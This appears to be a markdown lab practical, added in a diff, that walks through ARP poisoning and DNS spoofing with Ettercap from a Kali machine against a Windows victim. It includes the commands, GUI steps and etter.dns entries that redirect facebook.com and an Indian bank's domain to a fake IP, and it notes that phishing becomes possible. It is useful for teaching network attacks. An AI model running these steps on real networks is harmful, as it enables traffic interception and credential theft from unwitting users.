@@ -1,0 +1,176 @@
+# 🚩 **Practical: ARP Poisoning & DNS Spoofing using Ettercap**
+
+## 📌 **Goal**
+
+- **ARP Poisoning:** Trick the victim and gateway into sending traffic through your machine.
+- **DNS Spoofing:** Redirect domain requests to a fake IP.
+
+This demonstrates **Man-in-the-Middle (MITM)** concepts for labs.
+
+---
+
+## 🛠️ **Tools Used**
+
+- **Ettercap** — GUI & CLI MITM framework.
+- **Windows** machine (victim).
+- **Kali Linux** machine (attacker).
+
+---
+
+## 🔹 **STEP 1 — Verify Victim IP & ARP Table**
+
+👉 **On Windows (Victim):**
+
+Open **CMD**:
+
+```bash
+ipconfig /all
+arp -a
+```
+
+✔️ Note:
+
+- **IP address** of victim.
+- **Gateway IP**.
+- **ARP table** should show gateway’s MAC.
+
+---
+
+## 🔹 **STEP 2 — Start Ettercap GUI on Kali**
+
+```bash
+sudo ettercap -G
+```
+
+✅ `-G` → Starts Ettercap in **Graphical mode**.
+
+---
+
+## 🔹 **STEP 3 — Locate `etter.dns` File**
+
+Ettercap uses a DNS spoof config file:
+
+```bash
+sudo find / -name etter.dns
+```
+
+✅ Typically: `/etc/ettercap/etter.dns`
+
+---
+
+## 🔹 **STEP 4 — Edit DNS Spoofing File**
+
+```bash
+cd /etc/ettercap
+sudo nano etter.dns
+```
+
+**Add fake DNS entries** at the bottom:
+
+```
+www.facebook.com   A   196.1.1.172
+www.hdfcbank.com   A   196.1.1.172
+www.micromax.in    A   196.1.1.172
+
+196.1.1.172   PTR   www.facebook.com
+```
+
+✔️ This means:
+
+- Any request for `www.facebook.com` resolves to `196.1.1.172`.
+
+✅ Save: `Ctrl+O` → `Enter` → `Ctrl+X`.
+
+---
+
+## 🔹 **STEP 5 — Prepare MITM in Ettercap GUI**
+
+1️⃣ In Ettercap GUI:
+
+- **Sniff → Unified Sniffing → Select Interface** (e.g., `eth0`).
+
+2️⃣ **Scan for hosts:**
+
+- `Hosts → Scan for hosts`.
+
+3️⃣ View found hosts:
+
+- `Hosts → Host List`.
+
+4️⃣ **Add targets:**
+
+- Select victim IP → `Add to Target 1`.
+- Select gateway IP → `Add to Target 2`.
+
+---
+
+## 🔹 **STEP 6 — Load DNS Spoof Plugin**
+
+1️⃣ Plugins → **Manage Plugins**
+2️⃣ Double-click `dns_spoof` → should show **\[X]** (enabled).
+
+---
+
+## 🔹 **STEP 7 — Launch ARP Poisoning Attack**
+
+In Ettercap GUI:
+
+```
+Mitm → ARP Poisoning
+✔️ Sniff remote connections → OK
+```
+
+---
+
+## 🔹 **STEP 8 — Verify ARP Table**
+
+👉 **On Windows (Victim):**
+
+```bash
+arp -a
+```
+
+✅ The **gateway MAC** should now point to attacker’s MAC → shows ARP table is poisoned.
+
+---
+
+## 🔹 **STEP 9 — Test DNS Spoofing**
+
+👉 **On Windows (Victim):**
+
+```bash
+nslookup www.facebook.com
+```
+
+✅ The IP should resolve to: `196.1.1.172`.
+
+Open browser → `www.facebook.com` → it will attempt to load from fake IP.
+
+---
+
+## ✅ **How It Works**
+
+1️⃣ Ettercap **spoofs ARP replies** so victim sends packets to attacker.
+2️⃣ DNS requests to `facebook.com` go through attacker.
+3️⃣ **Ettercap DNS plugin** replies with fake IP (`196.1.1.172`).
+4️⃣ Victim’s browser connects to wrong IP → _MITM or phishing page possible_.
+
+---
+
+## ✅ **Practical Flow**
+
+| Step               | Command/Action                  |
+| ------------------ | ------------------------------- |
+| Check IP & ARP     | `ipconfig /all` + `arp -a`      |
+| Start Ettercap GUI | `sudo ettercap -G`              |
+| Find `etter.dns`   | `sudo find / -name etter.dns`   |
+| Edit DNS entries   | `sudo nano etter.dns`           |
+| Unified Sniffing   | Select interface (eth0)         |
+| Scan hosts         | `Hosts → Scan for hosts`        |
+| Add targets        | Host List → Add to Target 1 & 2 |
+| Load plugin        | `Plugins → dns_spoof`           |
+| Start ARP MITM     | `Mitm → ARP Poisoning`          |
+| Verify ARP         | `arp -a`                        |
+| Verify DNS spoof   | `nslookup www.facebook.com`     |
+
+---
